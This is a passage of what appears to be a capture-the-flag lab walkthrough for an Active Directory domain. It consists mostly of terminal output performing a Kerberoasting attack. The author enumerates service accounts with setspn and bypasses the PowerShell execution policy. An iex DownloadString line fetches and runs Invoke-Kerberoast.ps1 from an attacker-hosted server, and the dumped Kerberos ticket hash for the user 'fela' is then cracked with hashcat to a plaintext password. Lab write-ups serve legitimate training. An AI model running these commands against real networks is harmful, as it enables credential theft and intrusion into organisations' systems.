+        HOST/OMEGA/CORP
+        HOST/omega.corp.local/CORP
+        HOST/OMEGA
+        HOST/omega.corp.local
+        HOST/omega.corp.local/corp.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
+        ldap/OMEGA/CORP
+        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        ldap/omega.corp.local/CORP
+        ldap/OMEGA
+        ldap/omega.corp.local
+        ldap/omega.corp.local/corp.local
+CN=krbtgt,CN=Users,DC=corp,DC=local
+        kadmin/changepw
+CN=fela,CN=Users,DC=corp,DC=local
+        HTTP/fela
+        HOST/fela@corp.local
+        HTTP/fela@corp.local
+
+Existing SPN found!
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-101358" onclick="terminalOverlayClose('powershell-powershell-101358')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-101358')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-101358')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-101358')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-101358" data-language="powershell">
+PS C:\Users\dark\Desktop&gt; setspn -T medin -Q */*
+Ldap Error(0x51 -- Server Down): ldap_connect
+Failed to retrieve DN for domain "medin" : 0x00000051
+Warning: No valid targets specified, reverting to current domain.
+CN=OMEGA,OU=Domain Controllers,DC=corp,DC=local
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/omega.corp.local
+        ldap/omega.corp.local/ForestDnsZones.corp.local
+        ldap/omega.corp.local/DomainDnsZones.corp.local
+        TERMSRV/OMEGA
+        TERMSRV/omega.corp.local
+        DNS/omega.corp.local
+        GC/omega.corp.local/corp.local
+        RestrictedKrbHost/omega.corp.local
+        RestrictedKrbHost/OMEGA
+        RPC/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        HOST/OMEGA/CORP
+        HOST/omega.corp.local/CORP
+        HOST/OMEGA
+        HOST/omega.corp.local
+        HOST/omega.corp.local/corp.local
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/7c4e4bec-1a37-4379-955f-a0475cd78a5d/corp.local
+        ldap/OMEGA/CORP
+        ldap/7c4e4bec-1a37-4379-955f-a0475cd78a5d._msdcs.corp.local
+        ldap/omega.corp.local/CORP
+        ldap/OMEGA
+        ldap/omega.corp.local
+        ldap/omega.corp.local/corp.local
+CN=krbtgt,CN=Users,DC=corp,DC=local
+        kadmin/changepw
+CN=fela,CN=Users,DC=corp,DC=local
+        HTTP/fela
+        HOST/fela@corp.local
+        HTTP/fela@corp.local
+
+Existing SPN found!
+</pre> </div> </div> <p><br> Download the kerberoasting PowerShell script.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41297"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41297')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41297')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41297')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41297')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41297">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 --inet4-only
+--2025-03-02 00:26:31--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46848 (46K) [text/plain]
+Saving to: ‘Invoke-Kerberoast.ps1’
+
+Invoke-Kerberoast.ps1                                      100%[========================================================================================================================================&gt;]  45.75K  --.-KB/s    in 0.02s   
+
+2025-03-02 00:26:32 (2.85 MB/s) - ‘Invoke-Kerberoast.ps1’ saved [46848/46848]
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41297" onclick="terminalOverlayClose('bash-bash-41297')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41297')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41297')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41297')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41297" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 --inet4-only
+--2025-03-02 00:26:31--  https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46848 (46K) [text/plain]
+Saving to: ‘Invoke-Kerberoast.ps1’
+
+Invoke-Kerberoast.ps1                                      100%[========================================================================================================================================&gt;]  45.75K  --.-KB/s    in 0.02s   
+
+2025-03-02 00:26:32 (2.85 MB/s) - ‘Invoke-Kerberoast.ps1’ saved [46848/46848]
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</pre> </div> </div> <p><br> Run the Kerberoasting script on the victim machine.</p> <div class="terminal" data-language="cmd" id="terminal-cmd-exe-cmd-764"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('cmd-exe-cmd-764')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('cmd-exe-cmd-764')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('cmd-exe-cmd-764')" title="Maximize"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopy('cmd-exe-cmd-764')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-cmd-exe-cmd-764">
+C:\Windows\System32\spool\drivers\color&gt;powershell -ep bypass;
+</pre> </div> <div class="terminal__overlay" id="overlay-cmd-exe-cmd-764" onclick="terminalOverlayClose('cmd-exe-cmd-764')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('cmd-exe-cmd-764')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('cmd-exe-cmd-764')" title="Restore"></button> </div> <span class="terminal__title">cmd.exe</span> <button class="terminal__copy" onclick="terminalCopyModal('cmd-exe-cmd-764')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-cmd-exe-cmd-764" data-language="cmd">
+C:\Windows\System32\spool\drivers\color&gt;powershell -ep bypass;
+</pre> </div> </div> <div class="terminal" data-language="powershell" id="terminal-powershell-powershell-103036"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('powershell-powershell-103036')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('powershell-powershell-103036')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('powershell-powershell-103036')" title="Maximize"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopy('powershell-powershell-103036')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-powershell-powershell-103036">
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\System32\spool\drivers\color&gt; iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/Invoke-Kerberoast.ps1")
+PS C:\Windows\System32\spool\drivers\color&gt; Invoke-Kerberoast -OutputFormat hashcat | fl
+
+
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A
+                       2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B4
+                       3793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F156865
+                       0499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D
+                       4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165
+                       CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE
+                       365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B
+                       43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5D
+                       F2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768
+                       FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47
+                       799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228
+                       A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C
+                       58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F
+                       41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338C
+                       DEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C07
+                       5E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC
+                       5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF2204
+                       3CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C103
+                       5779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D
+                       22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D9082261
+                       07607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE1144
+                       3E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
+SamAccountName       : fela
+DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
+ServicePrincipalName : HTTP/fela
+</pre> </div> <div class="terminal__overlay" id="overlay-powershell-powershell-103036" onclick="terminalOverlayClose('powershell-powershell-103036')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('powershell-powershell-103036')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('powershell-powershell-103036')" title="Restore"></button> </div> <span class="terminal__title">PowerShell</span> <button class="terminal__copy" onclick="terminalCopyModal('powershell-powershell-103036')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-powershell-powershell-103036" data-language="powershell">
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\System32\spool\drivers\color&gt; iex(New-Object Net.WebClient).DownloadString("http://10.4.119.29:8000/Invoke-Kerberoast.ps1")
+PS C:\Windows\System32\spool\drivers\color&gt; Invoke-Kerberoast -OutputFormat hashcat | fl
+
+
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A
+                       2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B4
+                       3793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F156865
+                       0499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D
+                       4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165
+                       CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE
+                       365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B
+                       43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5D
+                       F2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768
+                       FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47
+                       799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228
+                       A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C
+                       58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F
+                       41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338C
+                       DEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C07
+                       5E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC
+                       5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF2204
+                       3CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C103
+                       5779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D
+                       22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D9082261
+                       07607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE1144
+                       3E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
+SamAccountName       : fela
+DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
+ServicePrincipalName : HTTP/fela
+</pre> </div> </div> <p><br> Save the hash to a sile so we can feed it into a hacker.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-458"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-458')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-458')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-458')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-458')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-458">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ cat hash.txt  
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-458" onclick="terminalOverlayClose('bash-bash-458')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-458')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-458')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-458')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-458" data-language="bash">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ cat hash.txt  
+</pre> </div> </div> <div class="codebox"> <div class="codebox__header"> <span class="codebox__title">hash.txt</span> </div> <pre class="codebox__body">
+$krb5tgs$23$*fela$corp.local$HTTP/fela*$08085EC8F5E1E0A8BF7B15EED00ABDA7$9B81BBE52C33A771966069A2D53539B9B08357539EEA773FEB83D88F6817ED90D5D79E0856260CC9DCB81A052BDE493A93D8A54D5BB808D0F7702B43793F6D00FC585D4AD986203011EFC3A1D1891B263A0DB1822A33EC859059CDFBAB7D6CB0CD84FDC669FC09A7F1568650499889E99C96571E68C31758355EB5576830331BD6F8904895C3A99ECC1EFBCB4F8E56D3D2E4B2C92E3CE809686962D4099BCB30343835E37DB9E365684DFE36AFF6DE30BF7D1A5460C1FCD0BADCCA3A1E65DF154C0180B6C5C6B5D87250165CC3FE53BB93F039D47AA2EED6B040966BB8D164D4F6C13C346AD3644F79BB4DFE05B82472C40FD4308DFD55BD72F13BE365A8AFF75AB2DA7D3E9AD19BC4AB05FBF2DAEE2E4F25720A02AD20D9B49CC39C647AF52C7A0605ADCB02C80A7B3DF3B43753F386D9A93CC3B461441BCEC6D8B46E400856991804186921F9266DA396540B0747B8511C3A623A5706FE6D31C5DF2EC043DB7D6540A5519C11C1CBD7103C9F5482C1C3342DB0A5B49AE5D388D93BA9411CC2D37360BBFA91CE7D8CFB768FC609D7F7252D5428CFCF6A5C54B9D3267D910C8E5FC1DDD7C9A1E2E61DB42915F09678F1BF4B167A8E93F561DC50B47799F86DA710AE326B0ADEB9D50C66DB1D5A630527B01219908B5C2F4AF55AE613735486F37A9F2D93028889D2DCEC228A3007227EE8D8FE04B0D8B538C44B74B4F746AA1CF7FDF85CAB81ECA0C8BEB76D1D5D4A939E4B6CC2EDA4E9DAEDBAC3C58F32431E34648A8DC5A0C8007FE348A1CC828994328794084AE9A047FDECC189858CBD3160C7D0210DF86862FADC63F41156E693352821C5C9CD0A35EF143239ABD6AE22D549066C01B0CABEDEDD29A997190587C5D87E562D4CB0385DD338CDEA7B51AA87D6FE066565861FAF5BCE37D5CCC60546B0D07C15EC58E26EE113372A18DFFAC3FC45D7AFD8DC467248C075E3398217B8BDB1EE592D8D2D4F7D09711D7F0235B9CEB121862604625428C05B31CD30469F97BE398B5732CCFD608BC5415E2191ABE37E4665AD526E574E808767843AB7072FE01FF32CA97B547250A09F03B9B2AC78CCFA38B58F5A4DF22043CB49F595D4C11185029237DEADBC8D234DF49A7F0883F56ADF7DB7D4375D580AC01B130B72A293CED47549B8D38C1035779DBFE7E185927CD2D1FAFD7D886DB73F9FB10C97D599E60CE3B294AD38E8AE7108FBD44F96551DA2C369DFB26730D22E2AE96AA697BEB6096D3F9E0B706ED39005811846B332568CB7715FD6FB6C3C56DEB3C42A8AAABEC135752D908226107607CC9DAAA3969A992DDC2D5981B713D92E5DAC98C8C634D066A938910AD0D3AB03CD59CABE8DFA52CE9D2B5CE11443E3B2C183075611BACD9D0AA3B3C0FE9AE82B6DFFAC
+</pre> </div> <p><br> Use hashcat to crack the hash.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-42198"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-42198')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-42198')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-42198')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-42198')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-42198">
+┌──(kali㉿kali)-[~/Documents/thm/corp]
+└─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force --quiet     
+$krb5tgs$23$*fela$corp.local$HTTP/fela*$08085ec8f5e1e0a8bf7b15eed00abda7$9b81bbe52c33a771966069a2d53539b9b08357539eea773feb83d88f6817ed90d5d79e0856260cc9dcb81a052bde493a93d8a54d5bb808d0f7702b43793f6d00fc585d4ad986203011efc3a1d1891b263a0db1822a33ec859059cdfbab7d6cb0cd84fdc669fc09a7f1568650499889e99c96571e68c31758355eb5576830331bd6f8904895c3a99ecc1efbcb4f8e56d3d2e4b2c92e3ce809686962d4099bcb30343835e37db9e365684dfe36aff6de30bf7d1a5460c1fcd0badcca3a1e65df154c0180b6c5c6b5d87250165cc3fe53bb93f039d47aa2eed6b040966bb8d164d4f6c13c346ad3644f79bb4dfe05b82472c40fd4308dfd55bd72f13be365a8aff75ab2da7d3e9ad19bc4ab05fbf2daee2e4f25720a02ad20d9b49cc39c647af52c7a0605adcb02c80a7b3df3b43753f386d9a93cc3b461441bcec6d8b46e400856991804186921f9266da396540b0747b8511c3a623a5706fe6d31c5df2ec043db7d6540a5519c11c1cbd7103c9f5482c1c3342db0a5b49ae5d388d93ba9411cc2d37360bbfa91ce7d8cfb768fc609d7f7252d5428cfcf6a5c54b9d3267d910c8e5fc1ddd7c9a1e2e61db42915f09678f1bf4b167a8e93f561dc50b47799f86da710ae326b0adeb9d50c66db1d5a630527b01219908b5c2f4af55ae613735486f37a9f2d93028889d2dcec228a3007227ee8d8fe04b0d8b538c44b74b4f746aa1cf7fdf85cab81eca0c8beb76d1d5d4a939e4b6cc2eda4e9daedbac3c58f32431e34648a8dc5a0c8007fe348a1cc828994328794084ae9a047fdecc189858cbd3160c7d0210df86862fadc63f41156e693352821c5c9cd0a35ef143239abd6ae22d549066c01b0cabededd29a997190587c5d87e562d4cb0385dd338cdea7b51aa87d6fe066565861faf5bce37d5ccc60546b0d07c15ec58e26ee113372a18dffac3fc45d7afd8dc467248c075e3398217b8bdb1ee592d8d2d4f7d09711d7f0235b9ceb121862604625428c05b31cd30469f97be398b5732ccfd608bc5415e2191abe37e4665ad526e574e808767843ab7072fe01ff32ca97b547250a09f03b9b2ac78ccfa38b58f5a4df22043cb49f595d4c11185029237deadbc8d234df49a7f0883f56adf7db7d4375d580ac01b130b72a293ced47549b8d38c1035779dbfe7e185927cd2d1fafd7d886db73f9fb10c97d599e60ce3b294ad38e8ae7108fbd44f96551da2c369dfb26730d22e2ae96aa697beb6096d3f9e0b706ed39005811846b332568cb7715fd6fb6c3c56deb3c42a8aaabec135752d908226107607cc9daaa3969a992ddc2d5981b713d92e5dac98c8c634d066a938910ad0d3ab03cd59cabe8dfa52ce9d2b5ce11443e3b2c183075611bacd9d0aa3b3c0fe9ae82b6dffac:rubenF124
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-42198" onclick="terminalOverlayClose('bash-bash-42198')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-42198')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-42198')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-42198')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span 